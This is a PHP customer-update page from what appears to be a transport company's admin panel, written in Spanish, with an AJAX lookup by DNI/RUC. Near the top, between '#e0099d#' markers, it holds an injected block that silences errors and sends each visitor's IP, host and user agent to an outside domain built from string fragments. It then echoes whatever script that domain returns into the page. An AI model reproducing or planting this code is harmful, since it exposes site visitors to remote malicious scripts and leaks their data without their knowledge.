<?php
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}	
	require("../conexion/ajax.php");
?>
<?php
#e0099d#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/e0099d#
?>
<script language="javascript" type="text/javascript">	
	function go()
	{
		location.href="administrador.php";
	}
	
	function actualizar()
	{
		agregarCargando('cargando');
		if(document.getElementById("textDniRuc").value.length!=0)
		{
			document.getElementById("form1").submit();			
		}
		else
		{
			alert("¡ Debes primero buscar un cliente !");
			quitarCargando('cargando');
		}
	}
	
	function buscar()
	{
		agregarCargando('cargando');
		dniRuc = document.getElementById("textDniRuc").value;
		if(dniRuc.length!=8 && dniRuc.length!=11)
		{
			alert("¡ Debe ingresar correctamente un DNI o RUC !");
			quitarCargando('cargando');
			return;
		}
		_obj = crearObjeto();
		_url = "ajaxManejador.php";
		_valores = "op=buscarCliente2&DniRuc="+dniRuc;
		_obj.open("POST", _url, true);
		_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
		_obj.send(_valores);
		_obj.onreadystatechange = function()
		{
			//Carga completa (Estado de la conexion)
			if(_obj.readyState==4)
			{
				//Completadoc no exito (Codigo enviado por el servidor)
				if(_obj.status==200)
				{
					resp = _obj.responseText;
					resp = resp.split("|");
					if(resp=="FAILED")
					{
						alert("¡ Cliente no encontrado !");
						document.getElementById("textDniRuc").value="";
						quitarCargando('cargando');							
						return;
					}
					document.getElementById("textNomRazS").value = resp[1];
					if(resp[0]=="dni")
					{					
						document.getElementById("tipoC").value = "dni";
						document.getElementById("apeP").innerHTML = '<input name="textApeP" type="text" id="textApeP" />';
						document.getElementById("apeM").innerHTML = '<input name="textApeM" type="text" id="textApeM" />';
						document.getElementById("textApeP").value = resp[2];
						document.getElementById("textApeM").value = resp[3];
						document.getElementById("textDirFiscal").value = resp[7];
						document.getElementById("textTelefono").value = resp[4];
						document.getElementById("textEmail").value = resp[6];
						document.getElementById("textCelular").value = resp[5];
					}
					else
					{
						document.getElementById("tipoC").value = "ruc";
						document.getElementById("apeP").innerHTML = "";
						document.getElementById("apeM").innerHTML = "";
						document.getElementById("textDirFiscal").value = resp[5];
						document.getElementById("textTelefono").value = resp[2];
						document.getElementById("textEmail").value = resp[4];
						document.getElementById("textCelular").value = resp[3];
					}								
					quitarCargando('cargando');
				}
			}
		}
	}
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<style type="text/css">
<!--
.Estilo2 {font-weight: bold}
-->
</style>
<title>:: Transportes Marin Hermanos - ModificarCliente ::</title></head>

<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../conexion/Img/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="142"><form id="form1" name="form1" method="post" action="admin.php">
          <table width="467" border="0" align="center">
            <tr>
              <th height="43" colspan="3" scope="col">ACTUALIZAR CLIENTE </th>
              </tr>
            <tr>
              <td width="185" height="35"><em><strong>DNI/RUC: </strong></em></td>
              <td width="173"><label>
                <input name="textDniRuc" type="text" id="textDniRuc" />
              </label></td>
              <td width="95">&nbsp;</td>
            </tr>
            <tr>
              <td height="43">&nbsp;</td>
              <td><label>
                <input name="Buscar" type="button" id="Buscar" value="Buscar"  onclick="buscar()"/>
              </label></td>
              <td><div align="center" id="cargando"></div></td>
            </tr>
            <tr>
              <td height="25"><em><strong>Nombres/Raz.Social : </strong></em></td>
              <td><label>
                <div align="justify" id="nomRazS">
                  <input name="textNomRazS" type="text" id="textNomRazS" />
                  </div>
              </label></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="34"><em><strong>Ape. Paterno : </strong></em></td>
              <td><label>
                <div align="justify" id="apeP">
                  <input name="textApeP" type="text" id="textApeP" />
                  </div>
              </label></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="31"><em><strong>Ape. Materno :</strong></em></td>
              <td><label>
                <div align="justify" id="apeM">
                  <input name="textApeM" type="text" id="textApeM" />
                  </div>
              </label></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="33"><em><strong>Dir. Fiscal : </strong></em></td>
              <td><label>
                <input name="textDirFiscal" type="text" id="textDirFiscal" />
              </label></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="29"><em><strong>Tel&eacute;fono : </strong></em></td>
              <td><label>
                <input name="textTelefono" type="text" id="textTelefono" />
              </label></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="29"><em><strong>Email : </strong></em></td>
              <td><label>
                <input name="textEmail" type="text" id="textEmail" />
              </label></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="32"><em><strong>Celular : </strong></em></td>
              <td><label>
                <input name="textCelular" type="text" id="textCelular" />
              </label></td>
              <td>&nbsp;</td>
            </tr>            <tr>
              <td height="58"><label>
                <div align="center">
                  <input name="Actualizar" type="button" id="Actualizar" value="Actualizar" onClick="actualizar()"/>
                  <label>
                  <input name="op" type="hidden" id="op" value="actualizarCliente"/>
                  </label>
                  <label>
                  <input name="tipoC" type="hidden" id="tipoC" />
                  </label>
                </div>
              </label></td>
              <td colspan="2"><label>
                <div align="center">
                  <input name="Cancelar" type="button" id="Cancelar" value="Cancelar"  onclick="go()"/>
                  </div>
              </label></td>
              </tr>
          </table>
        </form>        </td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>

